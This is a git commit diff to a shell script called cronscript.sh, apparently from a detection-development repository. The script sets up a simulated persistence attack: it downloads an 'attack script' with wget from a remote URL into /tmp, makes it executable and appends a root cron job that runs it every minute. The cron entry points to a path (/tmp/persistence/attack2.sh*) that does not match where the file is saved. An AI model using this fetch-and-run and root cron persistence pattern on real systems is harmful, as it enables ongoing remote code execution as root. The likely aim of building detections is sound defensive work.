b70f4adb97bab01a9c007e4fe768906d33e401f0
mikecybersec <67545678+mikecybersec@users.noreply.github.com>
2021-02-10 12:56:39 +0000

    Update cronscript.sh

--- cronscript.sh
+++ cronscript.sh
@@ -3,7 +3,7 @@
 mkdir /tmp/persistencetest/
 
 #Grab the attack script
-wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/hello.sh" -O /tmp/persistencetest/attack2.sh
+wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/hello1.sh" -O /tmp/persistencetest/attack2.sh
 
 #Wait for 5 seconds
 sleep 5
@@ -11,13 +11,8 @@ sleep 5
 chmod +x /tmp/persistencetest/attack2.sh
 
 sleep 5
-touch /var/spool/cron/root
-/usr/bin/crontab /var/spool/cron/root 
-
 
 #Create cron job to execute attack script every 1 minute
-echo "creating cron job"
-echo "*/1 * * * * sh /tmp/persistence/attack2.sh" >> /var/spool/cron/root
-
+echo "*/1 * * * * /tmp/persistence/attack2.sh*" >> /var/spool/cron/crontabs/root
 
 # crontab -u username -l to list the crontab for the user
